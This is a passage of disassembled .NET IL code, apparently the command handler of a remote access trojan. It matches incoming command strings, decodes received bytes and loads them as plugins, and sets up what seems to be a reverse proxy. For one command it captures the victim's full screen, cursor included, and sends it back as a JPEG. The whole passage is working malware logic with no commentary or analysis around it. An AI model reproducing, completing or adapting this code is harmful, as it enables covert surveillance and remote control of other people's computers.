      IL_03e5:  pop
      IL_03e6:  br.s       IL_03ef

      IL_03e8:  ldc.i4.1
      IL_03e9:  call       object F.P::Thr(int32)
      IL_03ee:  pop
      IL_03ef:  ldsfld     bool F.P::Cn
      IL_03f4:  ldc.i4.0
      IL_03f5:  ceq
      IL_03f7:  box        [mscorlib]System.Boolean
      IL_03fc:  ldloc.s    O0
      IL_03fe:  ldnull
      IL_03ff:  ldstr      "Off"
      IL_0404:  ldc.i4.0
      IL_0405:  newarr     [mscorlib]System.Object
      IL_040a:  ldnull
      IL_040b:  ldnull
      IL_040c:  ldnull
      IL_040d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0412:  ldc.i4.1
      IL_0413:  box        [mscorlib]System.Boolean
      IL_0418:  ldc.i4.0
      IL_0419:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_041e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_0423:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0428:  brfalse.s  IL_03e8

      IL_042a:  ldloc.s    O0
      IL_042c:  ldnull
      IL_042d:  ldstr      "off"
      IL_0432:  ldc.i4.1
      IL_0433:  newarr     [mscorlib]System.Object
      IL_0438:  stloc.s    VB$t_array$S1
      IL_043a:  ldloc.s    VB$t_array$S1
      IL_043c:  ldc.i4.0
      IL_043d:  ldc.i4.1
      IL_043e:  box        [mscorlib]System.Boolean
      IL_0443:  stelem.ref
      IL_0444:  ldloc.s    VB$t_array$S1
      IL_0446:  ldnull
      IL_0447:  ldnull
      IL_0448:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_044d:  leave      IL_0e1f

      IL_0452:  ldloc.s    VB$t_string$L1
      IL_0454:  ldstr      "ret"
      IL_0459:  ldc.i4.0
      IL_045a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_045f:  ldc.i4.0
      IL_0460:  bne.un     IL_0538

      IL_0465:  ldloc.1
      IL_0466:  ldc.i4.2
      IL_0467:  ldelem.ref
      IL_0468:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_046d:  ldc.i4.s   10
      IL_046f:  ble.s      IL_04c1

      IL_0471:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0476:  stloc.s    stream3
      IL_0478:  ldloc.1
      IL_0479:  ldc.i4.0
      IL_047a:  ldelem.ref
      IL_047b:  ldsfld     string F.P::Y
      IL_0480:  ldloc.1
      IL_0481:  ldc.i4.1
      IL_0482:  ldelem.ref
      IL_0483:  ldsfld     string F.P::Y
      IL_0488:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_048d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0492:  stloc.s    num3
      IL_0494:  ldloc.s    stream3
      IL_0496:  ldarg.0
      IL_0497:  ldloc.s    num3
      IL_0499:  ldarg.0
      IL_049a:  ldlen
      IL_049b:  conv.ovf.i4
      IL_049c:  ldloc.s    num3
      IL_049e:  sub.ovf
      IL_049f:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_04a4:  ldloc.s    stream3
      IL_04a6:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_04ab:  call       uint8[] F.P::Z(uint8[])
      IL_04b0:  call       uint8[] F.P::Z(uint8[])
      IL_04b5:  call       uint8[] F.P::Z(uint8[])
      IL_04ba:  call       uint8[] F.P::Z(uint8[])
      IL_04bf:  stloc.s    B7
      IL_04c1:  ldloc.s    B7
      IL_04c3:  ldstr      "A"
      IL_04c8:  call       object F.P::P00(uint8[],
                                           string)
      IL_04cd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04d2:  stloc.s    O1
      IL_04d4:  ldc.i4.5
      IL_04d5:  newarr     [mscorlib]System.String
      IL_04da:  stloc.s    VB$t_array$S0
      IL_04dc:  ldloc.s    VB$t_array$S0
      IL_04de:  ldc.i4.0
      IL_04df:  ldstr      "ret"
      IL_04e4:  stelem.ref
      IL_04e5:  ldloc.s    VB$t_array$S0
      IL_04e7:  ldc.i4.1
      IL_04e8:  ldsfld     string F.P::Y
      IL_04ed:  stelem.ref
      IL_04ee:  ldloc.s    VB$t_array$S0
      IL_04f0:  ldc.i4.2
      IL_04f1:  ldloc.1
      IL_04f2:  ldc.i4.1
      IL_04f3:  ldelem.ref
      IL_04f4:  stelem.ref
      IL_04f5:  ldloc.s    VB$t_array$S0
      IL_04f7:  ldc.i4.3
      IL_04f8:  ldsfld     string F.P::Y
      IL_04fd:  stelem.ref
      IL_04fe:  ldloc.s    VB$t_array$S0
      IL_0500:  ldc.i4.4
      IL_0501:  ldloc.s    O1
      IL_0503:  ldnull
      IL_0504:  ldstr      "GT"
      IL_0509:  ldc.i4.0
      IL_050a:  newarr     [mscorlib]System.Object
      IL_050f:  ldnull
      IL_0510:  ldnull
      IL_0511:  ldnull
      IL_0512:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0517:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_051c:  stloc.s    VB$t_string$S2
      IL_051e:  ldloca.s   VB$t_string$S2
      IL_0520:  call       string F.P::ENB(string&)
      IL_0525:  stelem.ref
      IL_0526:  ldloc.s    VB$t_array$S0
      IL_0528:  call       string [mscorlib]System.String::Concat(string[])
      IL_052d:  call       bool F.P::Send(string)
      IL_0532:  pop
      IL_0533:  leave      IL_0e1f

      IL_0538:  ldloc.s    VB$t_string$L1
      IL_053a:  ldstr      "pxr"
      IL_053f:  ldc.i4.0
      IL_0540:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0545:  ldc.i4.0
      IL_0546:  bne.un     IL_066c

      IL_054b:  call       string F.P::NPn()
      IL_0550:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0555:  ldc.i4.1
      IL_0556:  sub.ovf
      IL_0557:  stloc.s    porr
      IL_0559:  ldloc.1
      IL_055a:  ldc.i4.2
      IL_055b:  ldelem.ref
      IL_055c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0561:  ldc.i4.s   10
      IL_0563:  ble.s      IL_05b5

      IL_0565:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_056a:  stloc.s    V_32
      IL_056c:  ldloc.1
      IL_056d:  ldc.i4.0
      IL_056e:  ldelem.ref
      IL_056f:  ldsfld     string F.P::Y
      IL_0574:  ldloc.1
      IL_0575:  ldc.i4.1
      IL_0576:  ldelem.ref
      IL_0577:  ldsfld     string F.P::Y
      IL_057c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0581:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0586:  stloc.s    V_31
      IL_0588:  ldloc.s    V_32
      IL_058a:  ldarg.0
      IL_058b:  ldloc.s    V_31
      IL_058d:  ldarg.0
      IL_058e:  ldlen
      IL_058f:  conv.ovf.i4
      IL_0590:  ldloc.s    V_31
      IL_0592:  sub.ovf
      IL_0593:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0598:  ldloc.s    V_32
      IL_059a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_059f:  call       uint8[] F.P::Z(uint8[])
      IL_05a4:  call       uint8[] F.P::Z(uint8[])
      IL_05a9:  call       uint8[] F.P::Z(uint8[])
      IL_05ae:  call       uint8[] F.P::Z(uint8[])
      IL_05b3:  stloc.s    V_28
      IL_05b5:  ldloc.s    V_28
      IL_05b7:  ldsfld     string F.P::P_0
      IL_05bc:  call       object F.P::P00(uint8[],
                                           string)
      IL_05c1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05c6:  stloc.s    V_29
      IL_05c8:  ldloc.s    V_29
      IL_05ca:  ldnull
      IL_05cb:  ldstr      "Ho"
      IL_05d0:  ldc.i4.1
      IL_05d1:  newarr     [mscorlib]System.Object
      IL_05d6:  stloc.s    VB$t_array$S1
      IL_05d8:  ldloc.s    VB$t_array$S1
      IL_05da:  ldc.i4.0
      IL_05db:  call       object F.P::MH()
      IL_05e0:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05e5:  stelem.ref
      IL_05e6:  ldloc.s    VB$t_array$S1
      IL_05e8:  ldnull
      IL_05e9:  ldnull
      IL_05ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_05ef:  ldloc.s    V_29
      IL_05f1:  ldnull
      IL_05f2:  ldstr      "Po"
      IL_05f7:  ldc.i4.1
      IL_05f8:  newarr     [mscorlib]System.Object
      IL_05fd:  stloc.s    VB$t_array$S1
      IL_05ff:  ldloc.s    VB$t_array$S1
      IL_0601:  ldc.i4.0
      IL_0602:  ldloca.s   porr
      IL_0604:  call       instance string [mscorlib]System.Int32::ToString()
      IL_0609:  stelem.ref
      IL_060a:  ldloc.s    VB$t_array$S1
      IL_060c:  ldnull
      IL_060d:  ldnull
      IL_060e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0613:  ldloc.s    V_29
      IL_0615:  ldnull
      IL_0616:  ldstr      "VNo"
      IL_061b:  ldc.i4.1
      IL_061c:  newarr     [mscorlib]System.Object
      IL_0621:  stloc.s    VB$t_array$S1
      IL_0623:  ldloc.s    VB$t_array$S1
      IL_0625:  ldc.i4.0
      IL_0626:  ldsfld     string F.P::RG
      IL_062b:  stelem.ref
      IL_062c:  ldloc.s    VB$t_array$S1
      IL_062e:  ldnull
      IL_062f:  ldnull
      IL_0630:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0635:  ldloc.s    V_29
      IL_0637:  ldnull
      IL_0638:  ldstr      "Ruumm"
      IL_063d:  ldc.i4.0
      IL_063e:  newarr     [mscorlib]System.Object
      IL_0643:  ldnull
      IL_0644:  ldnull
      IL_0645:  ldnull
      IL_0646:  ldc.i4.1
      IL_0647:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_064c:  pop
      IL_064d:  ldstr      "pxr"
      IL_0652:  ldsfld     string F.P::Y
      IL_0657:  ldstr      "Ready"
      IL_065c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0661:  call       bool F.P::Send(string)
      IL_0666:  pop
      IL_0667:  leave      IL_0e1f

      IL_066c:  ldloc.s    VB$t_string$L1
      IL_066e:  ldstr      "REET"
      IL_0673:  ldc.i4.0
      IL_0674:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0679:  ldc.i4.0
      IL_067a:  bne.un     IL_07cd

      IL_067f:  ldloc.1
      IL_0680:  ldc.i4.2
      IL_0681:  ldelem.ref
      IL_0682:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0687:  ldc.i4.s   10
      IL_0689:  ble.s      IL_06db

      IL_068b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0690:  stloc.s    V_36
      IL_0692:  ldloc.1
      IL_0693:  ldc.i4.0
      IL_0694:  ldelem.ref
      IL_0695:  ldsfld     string F.P::Y
      IL_069a:  ldloc.1
      IL_069b:  ldc.i4.1
      IL_069c:  ldelem.ref
      IL_069d:  ldsfld     string F.P::Y
      IL_06a2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_06a7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_06ac:  stloc.s    V_35
      IL_06ae:  ldloc.s    V_36
      IL_06b0:  ldarg.0
      IL_06b1:  ldloc.s    V_35
      IL_06b3:  ldarg.0
      IL_06b4:  ldlen
      IL_06b5:  conv.ovf.i4
      IL_06b6:  ldloc.s    V_35
      IL_06b8:  sub.ovf
      IL_06b9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_06be:  ldloc.s    V_36
      IL_06c0:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_06c5:  call       uint8[] F.P::Z(uint8[])
      IL_06ca:  call       uint8[] F.P::Z(uint8[])
      IL_06cf:  call       uint8[] F.P::Z(uint8[])
      IL_06d4:  call       uint8[] F.P::Z(uint8[])
      IL_06d9:  stloc.s    V_33
      IL_06db:  ldloc.s    V_33
      IL_06dd:  ldstr      "A"
      IL_06e2:  call       object F.P::P00(uint8[],
                                           string)
      IL_06e7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06ec:  stloc.s    V_34
      IL_06ee:  ldloc.s    V_34
      IL_06f0:  ldnull
      IL_06f1:  ldstr      "Sti"
      IL_06f6:  ldc.i4.1
      IL_06f7:  newarr     [mscorlib]System.Object
      IL_06fc:  stloc.s    VB$t_array$S1
      IL_06fe:  ldloc.s    VB$t_array$S1
      IL_0700:  ldc.i4.0
      IL_0701:  ldsfld     string F.P::Sti
      IL_0706:  stelem.ref
      IL_0707:  ldloc.s    VB$t_array$S1
      IL_0709:  ldnull
      IL_070a:  ldnull
      IL_070b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0710:  ldloc.s    V_34
      IL_0712:  ldnull
      IL_0713:  ldstr      "Stu"
      IL_0718:  ldc.i4.1
      IL_0719:  newarr     [mscorlib]System.Object
      IL_071e:  stloc.s    VB$t_array$S1
      IL_0720:  ldloc.s    VB$t_array$S1
      IL_0722:  ldc.i4.0
      IL_0723:  ldsfld     string F.P::Stu
      IL_0728:  stelem.ref
      IL_0729:  ldloc.s    VB$t_array$S1
      IL_072b:  ldnull
      IL_072c:  ldnull
      IL_072d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0732:  ldloc.s    V_34
      IL_0734:  ldnull
      IL_0735:  ldstr      "VN"
      IL_073a:  ldc.i4.1
      IL_073b:  newarr     [mscorlib]System.Object
      IL_0740:  stloc.s    VB$t_array$S1
      IL_0742:  ldloc.s    VB$t_array$S1
      IL_0744:  ldc.i4.0
      IL_0745:  ldsfld     string F.P::VN
      IL_074a:  stelem.ref
      IL_074b:  ldloc.s    VB$t_array$S1
      IL_074d:  ldnull
      IL_074e:  ldnull
      IL_074f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0754:  ldloc.s    V_34
      IL_0756:  ldnull
      IL_0757:  ldstr      "Fol"
      IL_075c:  ldc.i4.1
      IL_075d:  newarr     [mscorlib]System.Object
      IL_0762:  stloc.s    VB$t_array$S1
      IL_0764:  ldloc.s    VB$t_array$S1
      IL_0766:  ldc.i4.0
      IL_0767:  ldsfld     string F.P::Fol
      IL_076c:  stelem.ref
      IL_076d:  ldloc.s    VB$t_array$S1
      IL_076f:  ldnull
      IL_0770:  ldnull
      IL_0771:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0776:  ldloc.s    V_34
      IL_0778:  ldnull
      IL_0779:  ldstr      "DR"
      IL_077e:  ldc.i4.1
      IL_077f:  newarr     [mscorlib]System.Object
      IL_0784:  stloc.s    VB$t_array$S1
      IL_0786:  ldloc.s    VB$t_array$S1
      IL_0788:  ldc.i4.0
      IL_0789:  ldsfld     string F.P::DR
      IL_078e:  stelem.ref
      IL_078f:  ldloc.s    VB$t_array$S1
      IL_0791:  ldnull
      IL_0792:  ldnull
      IL_0793:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0798:  ldstr      "ListVBiew0"
      IL_079d:  ldsfld     string F.P::Y
      IL_07a2:  ldloc.s    V_34
      IL_07a4:  ldnull
      IL_07a5:  ldstr      "GT2"
      IL_07aa:  ldc.i4.0
      IL_07ab:  newarr     [mscorlib]System.Object
      IL_07b0:  ldnull
      IL_07b1:  ldnull
      IL_07b2:  ldnull
      IL_07b3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_07b8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_07bd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_07c2:  call       bool F.P::Send(string)
      IL_07c7:  pop
      IL_07c8:  leave      IL_0e1f

      IL_07cd:  ldloc.s    VB$t_string$L1
      IL_07cf:  ldstr      "re"
      IL_07d4:  ldc.i4.0
      IL_07d5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07da:  ldc.i4.0
      IL_07db:  bne.un.s   IL_0851

      IL_07dd:  ldloc.1
      IL_07de:  ldc.i4.2
      IL_07df:  ldelem.ref
      IL_07e0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_07e5:  ldc.i4.s   10
      IL_07e7:  ble.s      IL_0839

      IL_07e9:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_07ee:  stloc.s    st3
      IL_07f0:  ldloc.1
      IL_07f1:  ldc.i4.0
      IL_07f2:  ldelem.ref
      IL_07f3:  ldsfld     string F.P::Y
      IL_07f8:  ldloc.1
      IL_07f9:  ldc.i4.1
      IL_07fa:  ldelem.ref
      IL_07fb:  ldsfld     string F.P::Y
      IL_0800:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0805:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_080a:  stloc.s    nu3
      IL_080c:  ldloc.s    st3
      IL_080e:  ldarg.0
      IL_080f:  ldloc.s    nu3
      IL_0811:  ldarg.0
      IL_0812:  ldlen
      IL_0813:  conv.ovf.i4
      IL_0814:  ldloc.s    nu3
      IL_0816:  sub.ovf
      IL_0817:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_081c:  ldloc.s    st3
      IL_081e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0823:  call       uint8[] F.P::Z(uint8[])
      IL_0828:  call       uint8[] F.P::Z(uint8[])
      IL_082d:  call       uint8[] F.P::Z(uint8[])
      IL_0832:  call       uint8[] F.P::Z(uint8[])
      IL_0837:  stloc.s    bu3
      IL_0839:  ldloc.s    bu3
      IL_083b:  ldstr      "A"
      IL_0840:  call       object F.P::P00(uint8[],
                                           string)
      IL_0845:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_084a:  stloc.s    obj
      IL_084c:  leave      IL_0e1f

      IL_0851:  ldloc.s    VB$t_string$L1
      IL_0853:  ldstr      "CAP"
      IL_0858:  ldc.i4.0
      IL_0859:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_085e:  ldc.i4.0
      IL_085f:  bne.un     IL_0998

      IL_0864:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0869:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_086e:  stloc.s    VB$t_struct$S7
      IL_0870:  ldloca.s   VB$t_struct$S7
      IL_0872:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0877:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_087c:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0881:  stloc.s    VB$t_struct$S8
      IL_0883:  ldloca.s   VB$t_struct$S8
      IL_0885:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_088a:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_088f:  stloc.s    x
      IL_0891:  ldloc.s    x
      IL_0893:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0898:  stloc.s    g
      IL_089a:  ldloc.s    g
      IL_089c:  ldc.i4.0
      IL_089d:  ldc.i4.0
      IL_089e:  ldc.i4.0
      IL_089f:  ldc.i4.0
      IL_08a0:  ldloca.s   VB$t_struct$S9
      IL_08a2:  ldloc.s    x
      IL_08a4:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_08a9:  ldloc.s    x
      IL_08ab:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_08b0:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_08b5:  ldloc.s    VB$t_struct$S9
      IL_08b7:  ldc.i4     0xcc0020
      IL_08bc:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_08c1:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_08c6:  ldloc.s    g
        IL_08c8:  ldloca.s   VB$t_struct$S8
        IL_08ca:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_08cf:  ldloca.s   VB$t_struct$S9
        IL_08d1:  ldc.i4.s   32
        IL_08d3:  ldc.i4.s   32
        IL_08d5:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_08da:  ldloc.s    VB$t_struct$S9
        IL_08dc:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_08e1:  ldloc.s    VB$t_struct$S8
        IL_08e3:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_08e8:  leave.s    IL_08f9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08ea:  dup
        IL_08eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08f0:  stloc.s    V_45
        IL_08f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08f7:  leave.s    IL_08f9

      }  // end handler
      IL_08f9:  ldloc.s    g
      IL_08fb:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0900:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0905:  stloc.s    V_42
      IL_0907:  ldstr      "CAP"
      IL_090c:  ldsfld     string F.P::Y
      IL_0911:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0916:  stloc.s    VB$t_string$S2
      IL_0918:  ldloca.s   VB$t_string$S2
      IL_091a:  call       uint8[] F.P::SB(string&)
      IL_091f:  starg.s    b
      IL_0921:  ldloc.s    V_42
      IL_0923:  ldarg.0
      IL_0924:  ldc.i4.0
      IL_0925:  ldarg.0
      IL_0926:  ldlen
      IL_0927:  conv.ovf.i4
      IL_0928:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_092d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0932:  stloc.s    MM
      IL_0934:  ldloc.s    x
      IL_0936:  ldloc.1
      IL_0937:  ldc.i4.1
      IL_0938:  ldelem.ref
      IL_0939:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_093e:  ldloc.1
      IL_093f:  ldc.i4.2
      IL_0940:  ldelem.ref
      IL_0941:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0946:  ldnull
      IL_0947:  ldloc.s    VB$t_struct$N10
      IL_0949:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                       int32,
                                                                                                                                       class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                       native int)
      IL_094e:  ldloc.s    MM
      IL_0950:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_0955:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_095a:  ldloc.s    V_42
      IL_095c:  ldloc.s    MM
      IL_095e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0963:  ldc.i4.0
      IL_0964:  ldloc.s    MM
      IL_0966:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_096b:  conv.ovf.i4
      IL_096c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0971:  ldloc.s    V_42
      IL_0973:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0978:  call       bool F.P::Sendb(uint8[])
      IL_097d:  pop
      IL_097e:  ldloc.s    V_42
      IL_0980:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0985:  ldloc.s    MM
      IL_0987:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_098c:  ldloc.s    x
      IL_098e:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0993:  leave      IL_0e1f

      IL_0998:  ldloc.s    VB$t_string$L1
      IL_099a:  ldstr      "un"
      IL_099f:  ldc.i4.0
      IL_09a0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09a5:  ldc.i4.0
